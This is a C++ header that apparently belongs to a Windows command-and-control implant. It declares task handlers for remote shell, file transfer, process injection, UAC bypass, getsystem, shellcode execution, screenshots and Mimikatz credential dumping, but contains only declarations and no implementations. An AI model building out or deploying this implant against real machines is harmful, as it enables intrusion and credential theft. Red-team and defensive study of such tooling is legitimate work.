#pragma once

#include "json.hpp"
#include <string>
#include <windows.h>

using json = nlohmann::json;

namespace Tasks {

    // Task status codes matching your original implementation
    enum class TaskStatus {
        SUCCESS = 4,
        FAILURE = 5,
        NOT_IMPLEMENTED = 6,
        INJECTION_FAILED = 7
    };

    // Task result structure
    struct TaskResult {
        TaskStatus status;
        std::string output;
        
        TaskResult() : status(TaskStatus::FAILURE), output("") {}
        TaskResult(TaskStatus s, const std::string& out) : status(s), output(out) {}
    };

    // Task type enumeration matching your original case numbers
    enum class TaskType {
        TERMINATE = 1,
        SHELL = 2,
        PWD = 3,
        CD = 4,
        WHOAMI = 5,
        PS = 6,
        DOWNLOAD = 7,
        UPLOAD = 8,
        LISTPRIVS = 9,
        SETPRIV = 10,
        INJECT = 11,
        BYPASSUAC = 12,
        GETSYSTEM = 13,
        SCREENSHOT = 14,
        SLEEP = 15,
        MIMIKATZ = 16
    };

    class TaskManager {
    public:
        /**
         * Execute a task based on its JSON definition
         * @param task JSON task object from server containing type, input, etc.
         * @return TaskResult with status and output
         */
        static TaskResult ExecuteTask(const json& task);

    private:
        // System and basic tasks
        static TaskResult ExecuteTerminate(const json& task);
        static TaskResult ExecuteShell(const json& task);
        static TaskResult ExecutePwd(const json& task);
        static TaskResult ExecuteCd(const json& task);
        static TaskResult ExecuteWhoami(const json& task);
        static TaskResult ExecutePs(const json& task);
        
        // File operations
        static TaskResult ExecuteDownload(const json& task);
        static TaskResult ExecuteUpload(const json& task);
        
        // Privilege and injection tasks
        static TaskResult ExecuteListPrivs(const json& task);
        static TaskResult ExecuteSetPriv(const json& task);
        static TaskResult ExecuteInject(const json& task);
        static TaskResult ExecuteBypassUAC(const json& task);
        static TaskResult ExecuteGetsystem(const json& task);
        
        // System interaction tasks
        static TaskResult ExecuteScreenshot(const json& task);
        static TaskResult ExecuteSleep(const json& task);
        static TaskResult ExecuteMimikatz(const json& task);
        
        // Helper functions
        static std::string ExecuteShellCommand(const std::string& command);
        static bool ExecuteSetPrivShellcode(char* shellcode, size_t shellcodeSize);
        static std::wstring StringToWString(const std::string& s);
        static std::string DownloadFilePayload(const json& task);
        static bool UploadFile(const std::string& taskId, const std::string& filePath, std::string& outputMessage);
        static int Inject_CreateRemoteThread(HANDLE hProc, PVOID payload, SIZE_T payload_len);
    };

} // namespace Tasks